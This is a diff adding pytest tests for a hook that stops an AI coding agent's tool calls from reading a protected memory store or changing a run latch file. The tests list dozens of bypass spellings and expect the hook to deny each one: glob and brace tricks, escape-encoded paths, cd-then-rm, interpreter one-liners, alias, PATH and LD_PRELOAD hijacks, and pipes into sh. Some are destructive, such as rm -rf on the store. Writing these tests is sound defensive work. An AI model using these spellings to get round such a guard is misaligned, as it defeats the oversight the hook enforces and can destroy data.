+@pytest.mark.skipif(sys.platform == "win32", reason="`//` starts a UNC path on Windows")
+def test_csr_double_slash_prefix_denied(store_world: _StoreWorld) -> None:
+    """POSIX abspath keeps exactly two leading slashes; the guard collapses them
+    (bypass review 3)."""
+    path = f"/{store_world.s}/runs/x.jsonl"
+    for tool, tool_input in (("Bash", {"command": f"cat {path}"}), ("Read", {"file_path": path})):
+        code, out = _run_in(store_world, tool, tool_input)
+        _assert_latch_denied(code, out, store_world.latch)
+
+
+_OVER_THE_BRACE_CAP = "{" + ",".join(f"d{index}" for index in range(80)) + ",recall}"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "ls ~/.ultracode-goal/recall*",
+        "cat ~/.ultracode-goal/rec?ll/runs/x.jsonl",
+        "cat ~/.ultracode-goal/[r]ecall/runs/x.jsonl",
+        "cat ~/.ultracode-goal/{recall,other}/runs/x.jsonl",
+        "cat ~/{.ultracode-goal/recall,other}/runs/x.jsonl",
+        "cat ~/.ultracode-goal/re{c..c}all/runs/x.jsonl",
+        f"cat ~/.ultracode-goal/{_OVER_THE_BRACE_CAP}/runs/x.jsonl",
+    ],
+    ids=["star", "question-mark", "bracket", "brace-list", "brace-across-a-slash", "brace-sequence", "brace-past-the-cap"],
+)
+def test_csr_glob_and_brace_spellings_of_the_store_denied(store_world: _StoreWorld, command: str) -> None:
+    """A glob that can match the store, and a brace expansion that yields it
+    (bypass review 4, bmad review 15)."""
+    code, out = _bash(store_world, command)
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_csr_glob_and_brace_tool_patterns_denied(store_world: _StoreWorld) -> None:
+    home = store_world.home.as_posix()
+    for tool, tool_input in (
+        ("Glob", {"pattern": f"{home}/.ultracode-goal/rec*/**"}),
+        ("Glob", {"pattern": "rec*/**/*.jsonl", "path": store_world.store.parent.as_posix()}),
+        ("Grep", {"pattern": "x", "glob": f"{home}/.ultracode-goal/{{recall,other}}/**"}),
+        ("Read", {"file_path": f"{home}/.ultracode-goal/rec?ll/runs/x.jsonl"}),
+    ):
+        code, out = _run_in(store_world, tool, tool_input)
+        _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_csr_globs_and_braces_that_miss_the_store_are_allowed(store_world: _StoreWorld) -> None:
+    """Controls: alternatives and globs that cannot be the store, and `**` from
+    a folder above it (the accepted ancestor-search residual)."""
+    parent = store_world.store.parent.as_posix()
+    for tool, tool_input in (
+        ("Bash", {"command": "cat ~/.ultracode-goal/{other,more}/x"}),
+        ("Bash", {"command": "ls ~/.ultracode-goal/other*"}),
+        ("Bash", {"command": "cat ~/.ultracode-goal/re[x]all/y"}),
+        ("Bash", {"command": "echo {a,b} && ls src/*.py"}),
+        ("Bash", {"command": f"cat {parent}/**/x"}),
+        ("Glob", {"pattern": "**/*.jsonl", "path": parent}),
+    ):
+        _assert_allowed(*_run_in(store_world, tool, tool_input))
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat ~+/.ultracode-goal/recall/runs/x.jsonl",
+        "cat $PWD/.ultracode-goal/recall/runs/x.jsonl",
+        "cat ${PWD}/.ultracode-goal/recall/runs/x.jsonl",
+        'rm -rf "$(pwd)/.ultracode-goal/recall"',
+        "rm -rf $( pwd -P )/.ultracode-goal/recall",
+        'rm -rf "`pwd`/.ultracode-goal/recall"',
+    ],
+    ids=["tilde-plus", "dollar-pwd", "braced-pwd", "pwd-substitution", "pwd-P-substitution", "pwd-backticks"],
+)
+def test_csr_cwd_spellings_read_as_the_event_cwd(store_world: _StoreWorld, command: str) -> None:
+    """`~+`, `$PWD`, `${PWD}`, `$(pwd)` and a backtick `pwd` are the event's
+    cwd, here the home (bypass review 5; PR 3 latch review A2)."""
+    code, out = _bash(store_world, command, cwd=store_world.home)
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "shopt -s extglob\nrm -rf ~/.ultracode-goal/recal@(l)",
+        "shopt -s extglob\nls ~/.ultracode-goal/recal+(l)/runs",
+        "ls ~/.ultracode-goal/!(x)/runs",
+        "cat ~/.ultracode-goal/?(recall)/runs/x.jsonl",
+        "cat ~/.ultracode-goal/*(recall)/runs/x.jsonl",
+    ],
+    ids=["at", "plus", "bang", "question", "star"],
+)
+def test_csr_store_extglob_spelling_denied(store_world: _StoreWorld, command: str) -> None:
+    """PR 3 latch review A3: a bash extglob group reads as a `*`, so it is a
+    glob that can match the store, as the guard says it finds."""
+    _assert_latch_denied(*_bash(store_world, command), store_world.latch)
+
+
+@pytest.mark.parametrize(
+    "spelling",
+    ["${HOME:-/x}", "${HOME%/}", "${HOME#}", "${USERPROFILE:-/x}"],
+    ids=["default", "suffix-strip", "prefix-strip", "userprofile-default"],
+)
+def test_csr_home_parameter_expansions_read_as_the_home(store_world: _StoreWorld, spelling: str) -> None:
+    """Bypass review 5."""
+    code, out = _bash(store_world, f"cat {spelling}/.ultracode-goal/recall/runs/x.jsonl")
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_csr_ansi_c_quoted_store_path_denied(store_world: _StoreWorld) -> None:
+    """`$'\\x..'` escapes spell the store without naming it literally (bypass review 5)."""
+    escaped = "".join(f"\\x{ord(char):02x}" for char in store_world.s)
+    for command in (f"cat $'{escaped}'/runs/x.jsonl", "cat $'\\x7e'/.ultracode-goal/recall/x"):
+        code, out = _bash(store_world, command)
+        _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_csr_macos_folds_case_and_form_on_the_deny_side_only(guard_module, monkeypatch) -> None:
+    """On macOS, whose file systems ignore case and Unicode form by default, the
+    deny side compares NFC-normalized and casefolded paths; the exemption does
+    not, so a pinned name in another case is not the pinned script on a
+    case-sensitive volume (bypass review 7)."""
+    monkeypatch.setattr(guard_module, "_FOLD_CASE_AND_FORM", True)
+    composed = os.path.join(os.sep, "Users", "u", "Caf\u00e9", "Recall")
+    decomposed = os.path.join(os.sep, "users", "u", "cafe\u0301", "recall")
+
+    assert guard_module._fold(composed) == guard_module._fold(decomposed)
+    roots = guard_module._roots(composed)
+    assert guard_module._names_store(
+        os.path.join(decomposed, "runs", "x.jsonl"), roots, [os.sep], [], os.sep, whole=True
+    )
+    if sys.platform != "win32":  # normcase already folds case there
+        pinned = guard_module._pinned_paths()[0]
+        other_case = os.path.join(os.path.dirname(pinned), os.path.basename(pinned).upper())
+        assert not guard_module._is_pinned(other_case)
+        assert guard_module._is_pinned(pinned)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat ~/.claude-m'e'm/claude-mem.db",
+        'cat ~/.claude-"mem"/claude-mem.db',
+        "cat ~/.claude-m\\em/claude-mem.db",
+        "cat ~/.claude-m?m/claude-mem.db",
+        "cat ~/.claude-m*/claude-mem.db",
+        "cat ~/.c*/claude-mem.db",
+        "cat ~/.claude-{mem,x}/claude-mem.db",
+        "cat ~/.c{l,x}aude-mem/claude-mem.db",
+        "cat $'\\x2e'claude-mem/claude-mem.db",
+        # Named outside any home: only the literal check, past its quoting, sees these.
+        "cat /srv/.claude-m'e'm/claude-mem.db",
+        "grep -rn x /srv/.claude-m\\em",
+    ],
+    ids=[
+        "single-quoted",
+        "double-quoted",
+        "backslash",
+        "question-mark",
+        "star",
+        "short-star",
+        "brace",
+        "brace-inside",
+        "ansi-c",
+        "quoted-outside-a-home",
+        "backslash-outside-a-home",
+    ],
+)
+def test_csr_claude_mem_spelled_around_quotes_globs_and_braces_denied(
+    store_world: _StoreWorld, command: str
+) -> None:
+    """Bypass review 8: the literal check reads past quotes and backslashes, and
+    a glob or brace expansion that reaches claude-mem's folder under a home
+    counts too."""
+    code, out = _bash(store_world, command)
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert "reaches into '.claude-mem'" in reason
+
+
+def test_csr_claude_mem_tool_patterns_denied(store_world: _StoreWorld) -> None:
+    home = store_world.home.as_posix()
+    for tool, tool_input in (
+        ("Glob", {"pattern": f"{home}/.claude-m*/**"}),
+        ("Grep", {"pattern": "x", "glob": home + "/.claude-{mem,x}/**"}),
+        ("Read", {"file_path": f"{home}/.claude-m?m/claude-mem.db"}),
+    ):
+        code, out = _run_in(store_world, tool, tool_input)
+        reason = _assert_latch_denied(code, out, store_world.latch)
+        assert "reaches into '.claude-mem'" in reason
+
+
+def test_csr_dot_globs_away_from_claude_mem_are_allowed(store_world: _StoreWorld) -> None:
+    """Controls: a dot glob in the repo is not claude-mem's folder under a home."""
+    for command in ("ls -d .*", "cat ./.c*", "ls ~/.config/x", "grep -rn claude src"):
+        _assert_allowed(*_bash(store_world, command))
+
+
+_RESOURCE_TOOLS = ("ReadMcpResourceTool", "ListMcpResourcesTool", "ReadMcpResourceDirTool")
+
+
+@pytest.mark.parametrize("server", ["plugin:claude-mem:mcp-search", "claude-mem", "claude_mem"])
+@pytest.mark.parametrize("tool", _RESOURCE_TOOLS)
+def test_csr_mcp_resource_calls_on_claude_mem_denied(store_world: _StoreWorld, tool: str, server: str) -> None:
+    """A resource read or listing reaches the claude-mem server through its
+    `server` input, not its tool name (bypass review 9)."""
+    code, out = _run_in(store_world, tool, {"server": server, "uri": "claude-mem://x"})
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert f"refusing a {tool} call on the claude-mem MCP server {server}." in reason
+
+
+@pytest.mark.parametrize("server", ["claude-memory", "plugin:claude-memoir:x", "Neon", None])
+def test_csr_mcp_resource_calls_elsewhere_are_allowed(store_world: _StoreWorld, server: str | None) -> None:
+    tool_input = {"uri": "x://y"} if server is None else {"server": server, "uri": "x://y"}
+    _assert_allowed(*_run_in(store_world, "ReadMcpResourceTool", tool_input))
+
+
+def test_csr_no_latch_leaves_mcp_resource_calls_alone(store_world: _StoreWorld) -> None:
+    store_world.latch.unlink()
+    _assert_allowed(*_run_in(store_world, "ReadMcpResourceTool", {"server": "claude-mem", "uri": "x"}))
+
+
+@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="no FIFOs here")
+def test_csr_fifo_at_the_latch_path_does_not_hang_the_guard(store_world: _StoreWorld) -> None:
+    """A FIFO at the latch path is a present latch that cannot be read: the
+    claude-mem deny still fires and nothing blocks on the read (C-2: no store,
+    so no path deny)."""
+    store_world.latch.unlink()
+    os.mkfifo(store_world.latch)
+    env = {**os.environ, **store_world.env}
+
+    def run(tool: str, tool_input: dict) -> subprocess.CompletedProcess:
+        return subprocess.run(
+            [sys.executable, str(HOOK)],
+            input=json.dumps(_mem_event(tool, store_world.cwd, tool_input)),
+            cwd=store_world.cwd,
+            capture_output=True,
+            text=True,
+            env=env,
+            timeout=60,
+        )
+
+    denied = run("mcp__claude-mem__search", {})
+    assert denied.returncode == 2, denied.stdout
+    allowed = run("Read", {"file_path": f"{store_world.s}/runs/x.jsonl"})
+    assert (allowed.returncode, allowed.stdout) == (0, "")
+
+
+@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="no FIFOs here")
+def test_csr_fifo_latch_held_open_by_a_writer_reads_as_unreadable(guard_module, tmp_path: Path) -> None:
+    """A FIFO whose writer holds it open and has filled it with a green latch
+    neither blocks the read nor yields a latch: the read past its data meets
+    no end of file, so the latch reads as None."""
+    fifo = tmp_path / ".mem-state.json"
+    os.mkfifo(fifo)
+    writer = os.open(fifo, os.O_RDWR)  # holds the FIFO open, so it never blocks
+    try:
+        os.write(writer, json.dumps(_v2_latch(tmp_path / "store")).encode("utf-8"))
+        assert guard_module._read_latch(fifo) is None
+    finally:
+        os.close(writer)
+
+
+def test_csr_oversized_latch_reads_as_unreadable(guard_module, store_world: _StoreWorld) -> None:
+    small = json.dumps(_v2_latch(store_world.store))
+    store_world.latch.write_text(small + " " * guard_module._LATCH_READ_CAP, encoding="utf-8")
+    assert guard_module._read_latch(store_world.latch) is None
+    store_world.latch.write_text(small, encoding="utf-8")
+    assert guard_module._read_latch(store_world.latch) == json.loads(small)
+
+
+# --- Guard item 7: the latch-path rule (decision 11) ---------------------------
+# While a latch is present, whatever it holds, a model tool call may read the
+# latch but not change it (AC-29, AC-30), and only the pinned recall scripts
+# change it. `latch_world` lays the folders out as a real run does: the
+# implementation artifacts inside the project, the project under the home, so
+# every home and working-folder spelling of the latch path can be written.
+
+
+@pytest.fixture
+def latch_world(tmp_path: Path) -> _StoreWorld:
+    """A green v2 latch at <home>/work/repo/_bmad-output/implementation-artifacts,
+    with the session's working folder at <home>/work/repo."""
+    home = tmp_path / "home"
+    store = home / ".ultracode-goal" / "recall"
+    cwd = home / "work" / "repo"
+    impl = cwd / "_bmad-output" / "implementation-artifacts"
+    store.mkdir(parents=True)
+    _write_state(impl, _v2_latch(store))
+    return _StoreWorld(home, store, cwd, impl, tmp_path)
+
+
+_LATCH_REL = "_bmad-output/implementation-artifacts/.mem-state.json"
+
+
+def _latch_spellings(world: _StoreWorld) -> dict[str, str]:
+    from_home = f"work/repo/{_LATCH_REL}"
+    return {
+        "absolute": world.latch.as_posix(),
+        "relative-to-cwd": _LATCH_REL,
+        "dot-relative": f"./{_LATCH_REL}",
+        "tilde": f"~/{from_home}",
+        "dollar-home": f"$HOME/{from_home}",
+        "braced-home": f"${{HOME}}/{from_home}",
+        "percent-userprofile": f"%USERPROFILE%/{from_home}",
+        "dollar-pwd": f"$PWD/{_LATCH_REL}",
+        "glob": "_bmad-output/implementation-artifacts/.mem-state.js??",
+        "brace": "_bmad-output/implementation-artifacts/.mem-{state,cache}.json",
+    }
+
+
+_LATCH_SPELLINGS = (
+    "absolute",
+    "relative-to-cwd",
+    "dot-relative",
+    "tilde",
+    "dollar-home",
+    "braced-home",
+    "percent-userprofile",
+    "dollar-pwd",
+    "glob",
+    "brace",
+)
+
+
+@pytest.mark.parametrize("channel", ["bash-rm", "bash-redirect", "write"])
+@pytest.mark.parametrize("spelling", _LATCH_SPELLINGS)
+def test_csr_latch_spelling_denied(latch_world: _StoreWorld, spelling: str, channel: str) -> None:
+    """AC-29: one deny per accepted spelling of the latch path, through a Bash
+    removal, a Bash redirection and the Write tool."""
+    path = _latch_spellings(latch_world)[spelling]
+    if channel == "write":
+        code, out = _run_in(latch_world, "Write", {"file_path": path, "content": "{}"})
+        reason = _assert_latch_denied(code, out, latch_world.latch)
+        assert "refusing a Write call whose file_path names the run latch." in reason
+        return
+    command = f"rm -f {path}" if channel == "bash-rm" else f"echo '{{}}' > {path}"
+    reason = _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)
+    assert "names the run latch and may change it." in reason
+
+
+def test_csr_latch_reached_through_a_symlink_denied(latch_world: _StoreWorld) -> None:
+    """AC-29: a link to the latch, and a link to its folder, lead to the latch,
+    so writing through either is a change; reading through one is not."""
+    to_latch = latch_world.tmp / "latch-link.json"
+    to_folder = latch_world.tmp / "impl-link"
+    _symlink_or_skip(to_latch, latch_world.latch)
+    _symlink_or_skip(to_folder, latch_world.impl)
+
+    for path in (to_latch.as_posix(), f"{to_folder.as_posix()}/.mem-state.json"):
+        for tool, tool_input in (
+            ("Bash", {"command": f"echo '{{}}' > {path}"}),
+            ("Write", {"file_path": path, "content": "{}"}),
+        ):
+            _assert_latch_denied(*_run_in(latch_world, tool, tool_input), latch_world.latch)
+    _assert_allowed(*_bash(latch_world, f"cat {to_latch.as_posix()}"))
+
+
+@pytest.mark.parametrize(
+    "tool,key",
+    [("Write", "file_path"), ("Edit", "file_path"), ("MultiEdit", "file_path"), ("NotebookEdit", "notebook_path")],
+    ids=["Write", "Edit", "MultiEdit", "NotebookEdit"],
+)
+def test_csr_latch_named_by_a_writing_tool_denied(latch_world: _StoreWorld, tool: str, key: str) -> None:
+    """AC-29: each tool that writes files is denied on the latch path."""
+    code, out = _run_in(latch_world, tool, _file_input(tool, key, latch_world.latch.as_posix()))
+    reason = _assert_latch_denied(code, out, latch_world.latch)
+    assert f"refusing a {tool} call whose {key} names the run latch." in reason
+
+
+def _latch_changes(world: _StoreWorld) -> dict[str, str]:
+    latch = world.latch.as_posix()
+    other = (world.tmp / "other.json").as_posix()
+    return {
+        # The forms decision 11 names (AC-29).
+        "rm": f"rm -f {latch}",
+        "mv-away": f"mv {latch} {other}",
+        "mv-onto": f"mv {other} {latch}",
+        "cp-onto": f"cp {other} {latch}",
+        "ln-onto": f"ln -sf {other} {latch}",
+        "tee": f"echo '{{}}' | tee {latch}",
+        "redirect": f"echo '{{}}' > {latch}",
+        "append": f"echo '{{}}' >> {latch}",
+        "glued-redirect": f"printf x >{latch}",
+        "clobber-redirect": f": >| {latch}",
+        "sed-i": f"sed -i s/on/off/ {latch}",
+        "truncate": f"truncate -s 0 {latch}",
+        "python-c": f"python -c \"open('{latch}', 'w').write('{{}}')\"",
+        "relative-rm": f"rm {_LATCH_REL}",
+        # The named forms are examples, not the rule: anything else is a change.
+        "dd": f"dd if=/dev/null of={latch}",
+        "touch": f"touch {latch}",
+        "chmod": f"chmod 000 {latch}",
+        "find-delete": f"find {latch} -delete",
+        "git-checkout": f"git checkout -- {latch}",
+        # The working folder spelled as a substitution (PR 3 latch review A2).
+        "pwd-substitution": f'rm -f "$(pwd)/{_LATCH_REL}"',
+        "pwd-backticks": f'rm -f "`pwd`/{_LATCH_REL}"',
+        "pwd-substitution-redirect": f'echo x > "$(pwd)/{_LATCH_REL}"',
+        # An extglob group reads as a `*` (A3).
+        "extglob-at": f"shopt -s extglob\nrm -f {_LATCH_DIR}/.mem-state.@(json)",
+        "extglob-plus": f"shopt -s extglob\nrm -f {_LATCH_DIR}/.mem-state.+(json)",
+        "extglob-bang": f"shopt -s extglob\nrm -f {_LATCH_DIR}/.mem-state.!(x)",
+        "extglob-question": f"shopt -s extglob\nrm -f {_LATCH_DIR}/.mem-state.?(json)",
+        # The file name on its own, with no path to it (B).
+        "cd-then-rm": f"cd {_LATCH_DIR} && rm -f .mem-state.json",
+        "cd-semicolon-rm": f"cd {world.impl.as_posix()}; rm .mem-state.json",
+        "pushd-then-rm": f"pushd {_LATCH_DIR} && rm .mem-state.json",
+        "subshell-cd-rm": f"(cd {_LATCH_DIR} && rm .mem-state.json)",
+        "cd-then-redirect": f"cd {_LATCH_DIR} && echo '{{}}' > .mem-state.json",
+        "cd-then-truncate": f"cd {_LATCH_DIR} && : > .mem-state.json",
+        "cd-then-dot-glob": f"cd {_LATCH_DIR} && rm -f .mem*",
+        "cd-then-short-dot-glob": f"cd {_LATCH_DIR} && rm -f .m*",
+        "cd-then-quoted-name": f"cd {_LATCH_DIR} && rm -f '.mem-state'.json",
+        "cd-then-escaped-name": f"cd {_LATCH_DIR} && rm -f \\.mem-state.json",
+        "cd-then-braced-name": f"cd {_LATCH_DIR} && rm -f .mem-{{state,x}}.json",
+        "variable-folder": f"D={_LATCH_DIR}; rm -f $D/.mem-state.json",
+        "oldpwd-tilde": f"cd {_LATCH_DIR} && cd - && rm -f ~-/.mem-state.json",
+        "proc-cwd": f"rm -f /proc/$$/cwd/{_LATCH_REL}",
+        "find-name-delete": "find . -name .mem-state.json -delete",
+        "find-glob-delete": f"find {_LATCH_DIR} -name '.mem-*' -delete",
+        "find-exec-rm": f"find {world.impl.as_posix()} -name .mem-state.json -exec rm {{}} +",
+        "globstar": "shopt -s globstar\nrm -f **/.mem-state.json",
+        "python-join": (
+            f"python3 -c \"import os; os.remove(os.path.join('{_LATCH_DIR}', '.mem-state.json'))\""
+        ),
+        "python-concat": f"python3 -c \"import os; os.remove('{_LATCH_DIR}/' + '.mem-state.json')\"",
+        "python-heredoc": (
+            f"python3 - <<'EOF'\nimport os\nos.remove(os.path.join('{_LATCH_DIR}', '.mem-state.json'))\nEOF"
+        ),
+        "node-e": f"node -e \"require('fs').unlinkSync('{_LATCH_DIR}/' + '.mem-state.json')\"",
+        "ansi-c-name": f"cd {_LATCH_DIR} && rm -f $'\\x2emem-state.json'",
+    }
+
+
+_LATCH_DIR = "_bmad-output/implementation-artifacts"
+
+
+_LATCH_CHANGES = (
+    "rm",
+    "mv-away",
+    "mv-onto",
+    "cp-onto",
+    "ln-onto",
+    "tee",
+    "redirect",
+    "append",
+    "glued-redirect",
+    "clobber-redirect",
+    "sed-i",
+    "truncate",
+    "python-c",
+    "relative-rm",
+    "dd",
+    "touch",
+    "chmod",
+    "find-delete",
+    "git-checkout",
+    "pwd-substitution",
+    "pwd-backticks",
+    "pwd-substitution-redirect",
+    "extglob-at",
+    "extglob-plus",
+    "extglob-bang",
+    "extglob-question",
+    "cd-then-rm",
+    "cd-semicolon-rm",
+    "pushd-then-rm",
+    "subshell-cd-rm",
+    "cd-then-redirect",
+    "cd-then-truncate",
+    "cd-then-dot-glob",
+    "cd-then-short-dot-glob",
+    "cd-then-quoted-name",
+    "cd-then-escaped-name",
+    "cd-then-braced-name",
+    "variable-folder",
+    "oldpwd-tilde",
+    "proc-cwd",
+    "find-name-delete",
+    "find-glob-delete",
+    "find-exec-rm",
+    "globstar",
+    "python-join",
+    "python-concat",
+    "python-heredoc",
+    "node-e",
+    "ansi-c-name",
+)
+
+
+@pytest.mark.parametrize("name", _LATCH_CHANGES)
+def test_csr_bash_change_to_the_latch_denied(latch_world: _StoreWorld, name: str) -> None:
+    """AC-29: one denied case per changing form. Past the named forms, the
+    latch review's bypasses: the working folder as a substitution, extglob,
+    and the file name with no path to it (a `cd` first, `find -name`, a path
+    an interpreter joins)."""
+    reason = _assert_latch_denied(*_bash(latch_world, _latch_changes(latch_world)[name]), latch_world.latch)
+    assert "names the run latch and may change it." in reason
+
+
+def _latch_unsure_reads(world: _StoreWorld) -> dict[str, str]:
+    latch = world.latch.as_posix()
+    other = (world.tmp / "other.json").as_posix()
+    evil = (world.tmp / "evil").as_posix()
+    return {
+        "read-into-a-file": f"cat {latch} > {other}",
+        "into-the-latch": f"cat {other} > {latch}",
+        "read-write-open": f"cat <> {latch}",
+        "stderr-to-dev-null": f"cat {latch} 2>/dev/null",
+        "piped-into-xargs": f"ls {latch} | xargs rm",
+        "piped-into-a-shell": f"ls {latch} |& sh",
+        "last-word": f'cat {latch}; rm -f "$_"',
+        "braced-last-word": f'test -e {latch} && rm -f "${{_}}"',
+        "function-named-cat": f'cat() {{ rm -f "$1"; }}; cat {latch}',
+        "alias": f"alias cat='rm -f'; cat {latch}",
+        "path-assignment": f"PATH={evil}:$PATH cat {latch}",
+        "export-path": f"export PATH={evil}; cat {latch}",
+        "ld-preload": f"LD_PRELOAD={evil}/x.so cat {latch}",
+        "reader-by-relative-path": f"./cat {latch}",
+        "reader-by-absolute-path": f"/bin/cat {latch}",
+        "env-wrapper": f"env cat {latch}",
+        "sudo-wrapper": f"sudo cat {latch}",
+        "bash-c": f"bash -c 'cat {latch}'",
+        "command-substitution": f"cat {latch} $(rm -f {latch})",
+        "backticks": f"cat {latch} `rm -f {latch}`",
+        "process-substitution": f"cat <(rm -f {latch})",
+        "unbalanced-quote": f"cat '{latch}",
+        "less-o": f"less -o {latch} {other}",
+        "sed-n": f"sed -n p {latch}",
+        "mention": f"echo 'remove {latch} later'",
+        # `=~` hands the match on through BASH_REMATCH (PR 3 latch review A1).
+        "rematch": f'[[ {latch} =~ .* ]] && rm -f "$BASH_REMATCH"',
+        "rematch-group": f'[[ {_LATCH_REL} =~ (.*) ]] && rm -f "${{BASH_REMATCH[1]}}"',
+        "rematch-newline": f'[[ {latch} =~ .* ]]\nmv "$BASH_REMATCH" {other}',
+        # The guard splits at `|` whatever the quoting, so a quoted pipe in a
+        # read's pattern makes a "pipe" into a piece that is not a read.
+        "quoted-pipe-in-a-pattern": f"grep -E 'run_id|recall' {latch}",
+        # The file name alone, in a command that is not a read, is denied.
+        "name-mention": "echo 'the latch is .mem-state.json'",
+    }
+
+
+_LATCH_UNSURE_READS = (
+    "read-into-a-file",
+    "into-the-latch",
+    "read-write-open",
+    "stderr-to-dev-null",
+    "piped-into-xargs",
+    "piped-into-a-shell",
+    "last-word",
+    "braced-last-word",
+    "function-named-cat",
+    "alias",
+    "path-assignment",
+    "export-path",
+    "ld-preload",
+    "reader-by-relative-path",
+    "reader-by-absolute-path",
+    "env-wrapper",
+    "sudo-wrapper",
+    "bash-c",
+    "command-substitution",
+    "backticks",
+    "process-substitution",
+    "unbalanced-quote",
+    "less-o",
+    "sed-n",
+    "mention",
+    "rematch",
+    "rematch-group",
+    "rematch-newline",
+    "quoted-pipe-in-a-pattern",
+    "name-mention",
+)
+
+
+@pytest.mark.parametrize("name", _LATCH_UNSURE_READS)
+def test_csr_latch_read_the_guard_cannot_vouch_for_is_denied(latch_world: _StoreWorld, name: str) -> None:
+    """Decision 11, fail closed: a segment naming the latch that the guard
+    cannot tell only reads it is denied. Each of these reads, or looks like a
+    read, yet can change the latch or hand its path to a command that does."""
+    _assert_latch_denied(*_bash(latch_world, _latch_unsure_reads(latch_world)[name]), latch_world.latch)
+
+
+def _latch_reads(world: _StoreWorld) -> dict[str, str]:
+    latch = world.latch.as_posix()
+    return {
+        "cat": f"cat {latch}",
+        "cat-relative": f"cat {_LATCH_REL}",
+        "cat-quoted": f'cat "{latch}"',
+        "head": f"head -c 200 {latch}",
+        "tail": f"tail -n 5 {latch}",
+        "wc": f"wc -c {latch}",
+        "grep": f"grep run_id {latch}",
+        "jq": f"jq -r .run_id {latch}",
+        "jq-input-redirect": f"jq -r .run_id < {latch}",
+        "ls": f"ls -la {latch}",
+        "stat": f"stat {latch}",
+        "test": f"test -e {latch}",
+        "bracket": f"[ -f {latch} ]",
+        "double-bracket": f"[[ -f {latch} ]]",
+        "cat-piped-into-jq": f"cat {latch} | jq -r .run_id",
+        "read-then-other-work": f"cat {latch} && echo done",
+        "if-test": f"if [ -e {latch} ]; then echo present; fi",
+        "safe-assignment": f"LC_ALL=C grep run_id {latch}",
+        "glob-listing": "ls _bmad-output/implementation-artifacts/.mem*",
+        "cd-then-cat-by-name": f"cd {_LATCH_DIR} && cat .mem-state.json",
+        "cd-then-list-dot-glob": f"cd {_LATCH_DIR} && ls -a .m*",
+    }
+
+
+_LATCH_READS = (
+    "cat",
+    "cat-relative",
+    "cat-quoted",
+    "head",
+    "tail",
+    "wc",
+    "grep",
+    "jq",
+    "jq-input-redirect",
+    "ls",
+    "stat",
+    "test",
+    "bracket",
+    "double-bracket",
+    "cat-piped-into-jq",
+    "read-then-other-work",
+    "if-test",
+    "safe-assignment",
+    "glob-listing",
+    "cd-then-cat-by-name",
+    "cd-then-list-dot-glob",
+)
+
+
+@pytest.mark.parametrize("name", _LATCH_READS)
+def test_csr_bash_read_of_the_latch_allowed(latch_world: _StoreWorld, name: str) -> None:
+    """AC-30: a Bash read of the latch passes, so Finalize can read it."""
+    _assert_allowed(*_bash(latch_world, _latch_reads(latch_world)[name]))
+
+
+def test_csr_read_tools_on_the_latch_allowed(latch_world: _StoreWorld) -> None:
+    """AC-30: Read, Grep and Glob only read, so the latch-path rule leaves
+    them alone."""
+    latch = latch_world.latch.as_posix()
+    for tool, tool_input in (
+        ("Read", {"file_path": latch}),
+        ("Read", {"file_path": _LATCH_REL}),
+        ("Grep", {"pattern": "run_id", "path": latch}),
+        ("Glob", {"pattern": ".mem-state.json", "path": latch_world.impl.as_posix()}),
+        ("Glob", {"pattern": "**/.mem-state.json"}),
+    ):
+        _assert_allowed(*_run_in(latch_world, tool, tool_input))
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "find . -type f -name '*.py' -not -path '*/.*'",
+        "rm -f .*.tmp",
+        "cp .env.example .env",
+        f"rm -f {_LATCH_DIR}/.mem-state.json.bak",
+        f"rm -f {_LATCH_DIR}/.mem-state-1a2b.tmp",
+        "echo 'x.mem-state.json and .mem-state.jsonl are other files'",
+        f"cd {_LATCH_DIR} && rm -f .current-story",
+    ],
+    ids=["hidden-skip", "dot-glob-of-other-files", "dotfile-copy", "backup-name", "temp-name", "longer-names", "other-dotfile"],
+)
+def test_csr_latch_name_rule_leaves_other_names_alone(latch_world: _StoreWorld, command: str) -> None:
+    """Control for the file-name rule: a dotfile glob that matches every
+    hidden file (`.*`, the way `find -not -path '*/.*'` skips them), another
+    dotfile, and a longer name that holds the latch's are not the latch."""
+    _assert_allowed(*_bash(latch_world, command))
+
+
+def _pinned_unlatch(world: _StoreWorld) -> str:
+    return (
+        f"uv run {_PINNED_RECALL.as_posix()} unlatch --impl-artifacts "
+        f"{world.impl.as_posix()} --run-id {_RUN}"
+    )
+
+
+def test_csr_pinned_latch_and_unlatch_calls_allowed(latch_world: _StoreWorld) -> None:
+    """AC-29 and AC-32 positive controls: the calls the prose makes at Stage 1
+    and at each exit pass under a present latch."""
+    recall = _PINNED_RECALL.as_posix()
+    impl = latch_world.impl.as_posix()
+    for command in (
+        _pinned_unlatch(latch_world),
+        f"python3 {recall} unlatch --impl-artifacts {impl} --run-id {_RUN}",
+        (
+            f"uv run {recall} latch --impl-artifacts {impl} --run-id {_RUN} "
+            "--recall on --store ~/.ultracode-goal/recall"
+        ),
+        f"uv run {recall} latch --impl-artifacts {impl} --run-id {_RUN} --recall off --store ''",
+    ):
+        _assert_allowed(*_bash(latch_world, command))
+
+
+def test_csr_latch_pinned_exemption_versus_a_same_named_script(latch_world: _StoreWorld) -> None:
+    """AC-29: the pinned script exemption (Guard item 3) covers a segment that
+    names the latch, and a same-named script outside the skill root does not.
+    Both calls name the latch as a trailing word: the guard reads a call's
+    words, not the script's options."""
+    elsewhere = latch_world.tmp / "x" / "scripts" / "mem_recall.py"
+    elsewhere.parent.mkdir(parents=True)
+    shutil.copyfile(_PINNED_RECALL, elsewhere)
+    args = (
+        f"unlatch --impl-artifacts {latch_world.impl.as_posix()} --run-id {_RUN} "
+        f"{latch_world.latch.as_posix()}"
+    )
+
+    _assert_allowed(*_bash(latch_world, f"uv run {_PINNED_RECALL.as_posix()} {args}"))
+    code, out = _bash(latch_world, f"uv run {elsewhere.as_posix()} {args}")
+    reason = _assert_latch_denied(code, out, latch_world.latch)
